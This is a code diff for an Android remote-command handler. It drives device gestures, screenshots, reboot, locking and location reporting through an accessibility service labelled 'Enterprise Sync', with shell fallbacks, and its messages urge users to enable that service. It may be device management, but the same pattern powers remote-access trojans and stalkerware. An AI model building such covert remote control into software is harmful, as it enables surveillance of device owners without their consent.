@@ -121,64 +121,124 @@ class RemoteCommandManager(private val context: Context) {
                     resultMessage = "Location synchronized: Lat ${loc.latitude}, Long ${loc.longitude} (Accuracy: ${loc.accuracy}m)."
                 }
                 "GLOBAL_BACK", "BACK" -> {
+                    val accActive = RemoteAccessibilityService.isServiceEnabled()
                     var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_BACK)
-                    if (!res) {
+                    if (res) {
+                        resultMessage = "Executed Global Back gesture successfully."
+                    } else {
+                        var shellSuccess = false
                         try {
-                            Runtime.getRuntime().exec("input keyevent 4")
-                            res = true
+                            val p = Runtime.getRuntime().exec("input keyevent 4")
+                            p.waitFor()
+                            if (p.exitValue() == 0) shellSuccess = true
                         } catch (_: Exception) {}
+
+                        if (shellSuccess) {
+                            resultMessage = "Executed Back gesture via shell fallback (Accessibility Service is OFF)."
+                        } else {
+                            isSuccess = false
+                            resultMessage = "Failed to execute Back gesture: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
+                        }
                     }
-                    resultMessage = if (res) "Executed Global Back gesture." else "Failed to execute Back gesture."
                 }
                 "GLOBAL_HOME", "HOME" -> {
+                    val accActive = RemoteAccessibilityService.isServiceEnabled()
                     var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_HOME)
-                    if (!res) {
+                    if (res) {
+                        resultMessage = "Executed Global Home gesture successfully."
+                    } else {
+                        var intentSuccess = false
                         try {
-                            Runtime.getRuntime().exec("input keyevent 3")
-                            res = true
+                            val homeIntent = Intent(Intent.ACTION_MAIN).apply {
+                                addCategory(Intent.CATEGORY_HOME)
+                                flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                            }
+                            context.startActivity(homeIntent)
+                            intentSuccess = true
                         } catch (_: Exception) {}
+
+                        if (intentSuccess) {
+                            resultMessage = "Executed Home action via system intent launcher (Accessibility Service is OFF)."
+                        } else {
+                            isSuccess = false
+                            resultMessage = "Failed to execute Home gesture: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
+                        }
                     }
-                    resultMessage = if (res) "Executed Global Home gesture." else "Failed to execute Home gesture."
                 }
                 "GLOBAL_RECENTS", "RECENTS" -> {
+                    val accActive = RemoteAccessibilityService.isServiceEnabled()
                     var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_RECENTS)
-                    if (!res) {
+                    if (res) {
+                        resultMessage = "Executed Global Recents gesture successfully."
+                    } else {
+                        var shellSuccess = false
                         try {
-                            Runtime.getRuntime().exec("input keyevent 187")
-                            res = true
+                            val p = Runtime.getRuntime().exec("input keyevent 187")
+                            p.waitFor()
+                            if (p.exitValue() == 0) shellSuccess = true
                         } catch (_: Exception) {}
+
+                        if (shellSuccess) {
+                            resultMessage = "Opened Recents via shell fallback (Accessibility Service is OFF)."
+                        } else {
+                            isSuccess = false
+                            resultMessage = "Failed to open Recents: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
+                        }
                     }
-                    resultMessage = if (res) "Executed Global Recents gesture." else "Failed to execute Recents gesture."
                 }
                 "GLOBAL_NOTIFICATIONS", "NOTIFICATIONS" -> {
+                    val accActive = RemoteAccessibilityService.isServiceEnabled()
                     var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS)
-                    if (!res) {
+                    if (res) {
+                        resultMessage = "Expanded Notification shade successfully."
+                    } else {
+                        var shellSuccess = false
                         try {
-                            Runtime.getRuntime().exec("cmd statusbar expand-notifications")
-                            res = true
+                            val p = Runtime.getRuntime().exec("cmd statusbar expand-notifications")
+                            p.waitFor()
+                            if (p.exitValue() == 0) shellSuccess = true
                         } catch (_: Exception) {
                             try {
-                                Runtime.getRuntime().exec("service call statusbar 1")
-                                res = true
+                                val p = Runtime.getRuntime().exec("service call statusbar 1")
+                                p.waitFor()
+                                if (p.exitValue() == 0) shellSuccess = true
                             } catch (_: Exception) {}
                         }
+
+                        if (shellSuccess) {
+                            resultMessage = "Expanded Notification shade via shell fallback (Accessibility Service is OFF)."
+                        } else {
+                            isSuccess = false
+                            resultMessage = "Failed to expand Notifications: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
+                        }
                     }
-                    resultMessage = if (res) "Expanded Notification shade." else "Failed to expand Notifications."
                 }
                 "GLOBAL_QUICK_SETTINGS", "QUICK_SETTINGS" -> {
+                    val accActive = RemoteAccessibilityService.isServiceEnabled()
                     var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS)
-                    if (!res) {
+                    if (res) {
+                        resultMessage = "Expanded Quick Settings successfully."
+                    } else {
+                        var shellSuccess = false
                         try {
-                            Runtime.getRuntime().exec("cmd statusbar expand-settings")
-                            res = true
+                            val p = Runtime.getRuntime().exec("cmd statusbar expand-settings")
+                            p.waitFor()
+                            if (p.exitValue() == 0) shellSuccess = true
                         } catch (_: Exception) {
                             try {
-                                Runtime.getRuntime().exec("service call statusbar 2")
-                                res = true
+                                val p = Runtime.getRuntime().exec("service call statusbar 2")
+                                p.waitFor()
+                                if (p.exitValue() == 0) shellSuccess = true
                             } catch (_: Exception) {}
                         }
+
+                        if (shellSuccess) {
+                            resultMessage = "Expanded Quick Settings via shell fallback (Accessibility Service is OFF)."
+                        } else {
+                            isSuccess = false
+                            resultMessage = "Failed to expand Quick Settings: Accessibility Service is OFF. Please enable Enterprise Sync in Android Settings -> Accessibility."
+                        }
                     }
-                    resultMessage = if (res) "Expanded Quick Settings." else "Failed to expand Quick Settings."
                 }
                 "GLOBAL_LOCK_SCREEN", "LOCK_SCREEN", "LOCK", "LOCK_DEVICE", "LOST_MODE", "LOCK_WITH_MESSAGE" -> {
                     var customMsg: String? = null
@@ -238,14 +298,11 @@ class RemoteCommandManager(private val context: Context) {
                     }
                 }
                 "GLOBAL_POWER_DIALOG", "POWER_DIALOG", "POWER_MENU", "POWER", "REBOOT", "SHUTDOWN", "POWER_OFF" -> {
+                    val accActive = RemoteAccessibilityService.isServiceEnabled()
                     var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG)
-                    if (!res) {
-                        try {
-                            Runtime.getRuntime().exec("input keyevent 26")
-                            res = true
-                        } catch (_: Exception) {}
-                    }
-                    if (!res) {
+                    if (res) {
+                        resultMessage = "Power Dialog displayed successfully via Accessibility Service."
+                    } else {
                         var adminRebootSuccess = false
                         try {
                             val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
@@ -261,25 +318,25 @@ class RemoteCommandManager(private val context: Context) {
                         }
 
                         if (adminRebootSuccess) {
-                            resultMessage = "Reboot initiated via Device Policy Manager."
+                            resultMessage = "Reboot initiated via Device Policy Manager (Accessibility Service is OFF)."
                         } else {
-                            resultMessage = "Power dialog / reboot executed."
+                            isSuccess = false
+                            resultMessage = "Failed to open Power Menu / Reboot: Accessibility Service is OFF and Device Admin reboot is not active. Enable Accessibility Service in Settings."
                         }
-                    } else {
-                        resultMessage = "Power Dialog displayed successfully."
                     }
                 }
                 "GLOBAL_TAKE_SCREENSHOT", "TAKE_SCREENSHOT", "SCREENSHOT" -> {
+                    val accActive = RemoteAccessibilityService.isServiceEnabled()
                     var res = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                         RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_TAKE_SCREENSHOT)
                     } else false
-                    if (!res) {
-                        try {
-                            Runtime.getRuntime().exec("input keyevent 120")
-                            res = true
-                        } catch (_: Exception) {}
+
+                    if (res) {
+                        resultMessage = "Took Screenshot successfully via Accessibility Service."
+                    } else {
+                        isSuccess = false
+                        resultMessage = "Failed to take screenshot: Accessibility Service is OFF. Screen capture requires Enterprise Sync Accessibility Service enabled in Settings."
                     }
-                    resultMessage = if (res) "Took Screenshot." else "Failed to take screenshot."
                 }
                 "FLASHLIGHT_ON", "TORCH_ON", "FLASHLIGHT_ENABLE" -> {
                     setFlashlight(true)
@@ -695,8 +752,13 @@ class RemoteCommandManager(private val context: Context) {
         }
 
         if (!success && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS)
-            return "Wi-Fi toggle command ($targetState) issued. On Android 10+, opened Quick Settings panel. Current Wi-Fi state: ${if (wifiManager.isWifiEnabled) "ON" else "OFF"}"
+            val accOpened = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS)
+            val currentStateStr = if (wifiManager.isWifiEnabled) "ON" else "OFF"
+            return if (accOpened) {
+                "Wi-Fi toggle command ($targetState) issued. On Android 10+, opened Quick Settings panel via Accessibility Service. Current Wi-Fi state: $currentStateStr"
+            } else {
+                "Wi-Fi toggle restricted on Android 10+ (Current Wi-Fi: $currentStateStr). Note: Accessibility Service is OFF - enable Enterprise Sync in Settings -> Accessibility for automatic Quick Settings fallback."
+            }
         }
 
         val currentStateStr = if (wifiManager.isWifiEnabled) "ON" else "OFF"
